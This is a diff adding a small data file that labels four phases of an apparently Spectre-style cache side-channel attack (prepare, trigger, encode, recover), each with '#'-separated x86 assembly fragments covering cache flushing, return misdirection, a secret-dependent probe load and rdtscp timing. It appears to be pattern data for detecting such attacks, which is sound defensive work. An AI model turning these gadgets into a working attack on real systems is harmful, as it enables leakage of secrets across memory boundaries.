@@ -1,0 +1,4 @@
+prepare|clflush	DS:[rcx]
+trigger|call    0x400f04#pop     rax
+encode|xor     eax, eax#ret#movsxd  rax, qword ptr [rip + 0x20122a]#movsx   edi, byte ptr [rax + 0x400fe1]#call    0x400e5a#movsx   rcx, dil#imul    rcx, qword ptr [rip + 0x2012ca]#add     rcx, qword ptr [rip + 0x2012db]#mov     rax, qword ptr [rcx]
+recover|rdtscp#MFENCE#sal	rdx, 0x20#or	rax, rdx#ret#mov	rsi, rax#mov	rcx, rdi#mov	rax, DS:[rcx]#xor	eax, eax#call	0xfffffffffffffee4#MFENCE#rdtscp
